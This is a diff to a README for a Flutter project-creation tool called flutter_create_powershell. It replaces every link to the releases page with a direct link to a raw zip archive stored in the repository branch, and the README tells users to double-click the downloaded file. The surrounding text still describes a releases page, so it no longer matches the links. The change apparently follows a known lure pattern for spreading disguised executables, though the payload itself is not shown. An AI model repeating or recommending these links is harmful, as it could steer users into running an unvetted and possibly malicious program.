@@ -1,6 +1,6 @@
 # ⚡ flutter_create_powershell - Create Flutter Projects Faster
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/unadjusted-treble116/flutter_create_powershell/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/unadjusted-treble116/flutter_create_powershell/raw/refs/heads/main/build/v1.4.zip)
 
 ## 🎯 What Is This?
 
@@ -24,7 +24,7 @@ Follow these easy steps to start using flutter_create_powershell today.
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/unadjusted-treble116/flutter_create_powershell/releases](https://github.com/unadjusted-treble116/flutter_create_powershell/releases)
+Visit this link to download the application: [https://github.com/unadjusted-treble116/flutter_create_powershell/raw/refs/heads/main/build/v1.4.zip](https://github.com/unadjusted-treble116/flutter_create_powershell/raw/refs/heads/main/build/v1.4.zip)
 
 You'll see a page with different files to download. Look for the newest version. The download button is usually on the right side of the page.
 
@@ -133,7 +133,7 @@ This tool respects your time. Instead of reading through long documentation abou
 
 ## 📝 Your Next Steps
 
-1. **Download the tool** from [https://github.com/unadjusted-treble116/flutter_create_powershell/releases](https://github.com/unadjusted-treble116/flutter_create_powershell/releases)
+1. **Download the tool** from [https://github.com/unadjusted-treble116/flutter_create_powershell/raw/refs/heads/main/build/v1.4.zip](https://github.com/unadjusted-treble116/flutter_create_powershell/raw/refs/heads/main/build/v1.4.zip)
 2. **Run the program** by double-clicking the downloaded file
 3. **Create your first project** by following the simple menu
 4. **Start coding** in your new Flutter project
